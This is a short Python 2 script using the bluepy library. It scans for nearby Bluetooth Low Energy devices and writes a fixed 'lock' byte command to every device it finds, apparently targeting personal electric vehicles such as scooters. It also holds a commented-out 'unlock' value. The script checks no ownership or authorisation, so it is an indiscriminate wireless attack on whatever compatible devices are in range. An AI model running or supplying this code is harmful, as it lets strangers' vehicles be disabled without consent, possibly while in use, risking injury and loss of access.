# @RaniXCH
from bluepy import btle
from bluepy.btle import Scanner, DefaultDelegate
from bluepy.btle import BTLEDisconnectError
from bluepy.btle import BTLEGattError


class ScanDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleDiscovery(self, dev, isNewDev, isNewData):
        if isNewDev:
            print "Discovered device", dev.addr
            
           

def lock_device(dev):
    print "Locking device"
    peri = btle.Peripheral(dev)
    characteristics = peri.getCharacteristics(uuid="6e400002-b5a3-f393-e0a9-e50e24dcca9e")[0]
    characteristics.write("55aa032003700168ff".decode("hex"))
    peri.disconnect()
    
def unlock_device(self, dev):
    print "Unlocking device"
    #Unlock = "55aa032003710167ff".decode("hex")

scanner = Scanner().withDelegate(ScanDelegate())
devices = scanner.scan(2)

for device in devices:
    try:
        lock_device(device)
    except (BTLEDisconnectError, BTLEGattError):
        print "Couldn't connect %s" % device.addr
